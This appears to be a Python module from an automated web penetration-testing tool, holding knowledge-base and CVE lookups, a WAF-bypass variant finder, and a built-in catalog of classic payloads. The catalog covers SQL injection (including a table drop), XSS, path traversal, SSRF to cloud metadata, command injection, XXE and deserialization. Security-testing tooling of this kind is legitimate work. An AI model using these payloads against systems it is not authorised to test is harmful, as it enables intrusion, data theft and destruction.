"""Knowledge primitives — KB lookups, attack vector lists, CVE queries.

Thin wrappers over vxis.knowledge.store, vxis.scoring.vectors, and
vxis.watchers.cve_daemon. No LLM calls.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

_WAF_DB_PATH = Path(__file__).parent / "waf_bypass_db.json"
_waf_db_cache: dict | None = None


def _load_waf_db() -> dict:
    global _waf_db_cache
    if _waf_db_cache is None:
        try:
            _waf_db_cache = json.loads(_WAF_DB_PATH.read_text())
        except Exception as exc:
            logger.warning("Failed to load waf_bypass_db.json: %s", exc)
            _waf_db_cache = {}
    return _waf_db_cache


# ── Knowledge Base queries ────────────────────────────────────────


def query_kb(tech_stack: list[str], vuln_type: str = "") -> list[dict]:
    """Query the VXIS knowledge store for compiled patterns and capability profiles.

    Args:
        tech_stack: List of technologies detected on the target (e.g. ["nginx", "php"]).
        vuln_type: Optional vulnerability filter (e.g. "sqli", "xss").

    Returns:
        List of knowledge entries: [{tool, context_sig, effectiveness, finding_types, ...}].
    """
    try:
        from vxis.knowledge.store import KnowledgeStore
    except Exception as exc:
        logger.debug("KnowledgeStore unavailable: %s", exc)
        return []

    try:
        store = KnowledgeStore()
    except Exception as exc:
        logger.debug("KnowledgeStore init failed: %s", exc)
        return []

    results: list[dict] = []
    tech_lower = {t.lower() for t in tech_stack}

    # Dump all capability profiles relevant to the tech stack.
    profiles = getattr(store, "_profiles", {}) or {}
    for tool, profile in profiles.items():
        best = {t.lower() for t in getattr(profile, "best_against", []) or []}
        if tech_lower & best or not tech_stack:
            results.append(
                {
                    "type": "capability_profile",
                    "tool": tool,
                    "best_against": list(best),
                    "worst_against": list(getattr(profile, "worst_against", []) or []),
                    "total_runs": getattr(profile, "total_runs", 0),
                }
            )

    # Dump compiled patterns filtered by vuln_type.
    patterns = getattr(store, "_patterns", []) or []
    for pat in patterns:
        pat_types = getattr(pat, "finding_types", []) or []
        if vuln_type and not any(vuln_type.lower() in t.lower() for t in pat_types):
            continue
        results.append(
            {
                "type": "compiled_pattern",
                "tool": getattr(pat, "action_tool", ""),
                "args": getattr(pat, "action_args", {}),
                "confidence": getattr(pat, "confidence", 0.0),
                "finding_types": pat_types,
                "context": getattr(pat, "context_signature", ""),
            }
        )

    return results


# ── Attack vector catalog ─────────────────────────────────────────


def list_vectors(category: str = "", phase: str = "") -> list[dict]:
    """List all attack vectors, optionally filtered by category and phase.

    Returns entries from WEB_VECTORS, GAME_VECTORS, and MOBILE_VECTORS.
    """
    from vxis.scoring.vectors import GAME_VECTORS, MOBILE_VECTORS, WEB_VECTORS

    out: list[dict] = []
    for vec_tuple, target_type in (
        (WEB_VECTORS, "web"),
        (GAME_VECTORS, "game"),
        (MOBILE_VECTORS, "mobile"),
    ):
        for v in vec_tuple:
            if category and v.category != category:
                continue
            if phase and v.phase != phase:
                continue
            out.append(
                {
                    "id": v.id,
                    "category": v.category,
                    "name_en": v.name_en,
                    "name_ko": v.name_ko,
                    "target_types": list(v.target_types),
                    "phase": v.phase,
                    "max_depth": v.max_depth,
                    "owasp_id": v.owasp_id,
                    "target_type": target_type,
                }
            )
    return out


def get_vector_payloads(vector_id: str) -> list[str]:
    """Return baseline payloads associated with a given vector id.

    Uses a small built-in catalog mapped by vector category. The Brain can
    request WAF-specific variants via get_waf_bypass_variants().
    """
    from vxis.scoring.vectors import get_vector_by_id

    vec = get_vector_by_id(vector_id)
    if vec is None:
        return []

    catalog: dict[str, list[str]] = {
        "injection": [
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
            "admin'--",
            "' OR SLEEP(5)--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "ssrf": [
            "http://127.0.0.1/",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO",
        ],
        "command_injection": [
            "; id",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
        ],
        "xxe": [
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
        ],
        "deserialization": [
            "O:8:\"stdClass\":1:{s:4:\"exec\";s:3:\"id\";}",
            "rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxl",
        ],
    }

    category = (vec.category or "").lower()
    for key, payloads in catalog.items():
        if key in category or category in key:
            return payloads
    return []


# ── CVE lookup ────────────────────────────────────────────────────


def cve_lookup(product: str, version: str = "") -> list[dict]:
    """Look up CVE entries affecting a product (and optionally a specific version).

    Uses the local CVE daemon cache if available, otherwise returns an empty list.
    """
    product_l = product.lower()
    results: list[dict] = []

    # Try the local CVE daemon cache.
    try:
        from vxis.watchers.cve_daemon import CVEDaemon  # type: ignore
    except Exception:
        CVEDaemon = None  # type: ignore[assignment]

    if CVEDaemon is not None:
        try:
            daemon = CVEDaemon()  # type: ignore[call-arg]
            cached = getattr(daemon, "_cache", None) or getattr(daemon, "cache", None) or []
            if isinstance(cached, dict):
                cached = list(cached.values())
            for entry in cached or []:
                data = entry if isinstance(entry, dict) else getattr(entry, "__dict__", {})
                desc = str(data.get("description", "")).lower()
                cpe = " ".join(data.get("cpe", []) if isinstance(data.get("cpe"), list) else [])
                if product_l in desc or product_l in cpe.lower():
                    if version and version not in desc and version not in cpe:
                        continue
                    results.append(
                        {
                            "cve_id": data.get("cve_id") or data.get("id", ""),
                            "description": data.get("description", ""),
                            "cvss": data.get("cvss", 0.0),
                            "published": data.get("published", ""),
                            "references": data.get("references", []),
                        }
                    )
        except Exception as exc:
            logger.debug("CVEDaemon lookup failed: %s", exc)

    return results


# ── WAF bypass variants ───────────────────────────────────────────


def get_waf_bypass_variants(original_payload: str, waf_type: str) -> list[str]:
    """Return known bypass variants for an original payload against a given WAF.

    Uses the static waf_bypass_db.json. If the WAF is unknown or the exact
    payload isn't present, falls back to the "generic" WAF entries and any
    variants whose original substring-matches the given payload.
    """
    db = _load_waf_db()
    waf_key = (waf_type or "generic").lower()
    candidates = db.get(waf_key) or db.get("generic") or {}

    variants: list[str] = []
    for category, entries in candidates.items():
        for entry in entries:
            orig = entry.get("original", "")
            if not orig:
                continue
            if orig == original_payload or orig in original_payload or original_payload in orig:
                variants.extend(entry.get("variants", []))

    # Also scan generic as a fallback if nothing matched in the specific WAF.
    if not variants and waf_key != "generic":
        generic = db.get("generic") or {}
        for entries in generic.values():
            for entry in entries:
                orig = entry.get("original", "")
                if orig and (orig in original_payload or original_payload in orig):
                    variants.extend(entry.get("variants", []))

    # Deduplicate while preserving order.
    seen: set[str] = set()
    out: list[str] = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out
